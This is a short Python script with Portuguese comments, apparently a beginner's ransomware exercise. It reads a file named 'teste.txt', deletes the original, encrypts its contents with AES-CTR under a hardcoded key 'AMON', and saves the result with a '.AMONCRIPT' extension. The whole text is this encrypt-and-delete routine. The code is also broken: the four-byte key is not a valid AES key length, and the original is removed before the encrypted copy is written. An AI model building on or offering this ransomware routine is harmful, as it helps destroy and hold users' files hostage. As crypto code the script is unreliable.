import os 
import pyaes

## abrir o arquivo

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## remover arquivo original
os.remove(file_name)

## definir a chave de encriptacao

key = b"AMON"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografando o arquivo
crypto_data = aes.encrypt(file_data)

# salvando o arquivo criptografado
new_file = file_name + '.AMONCRIPT'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()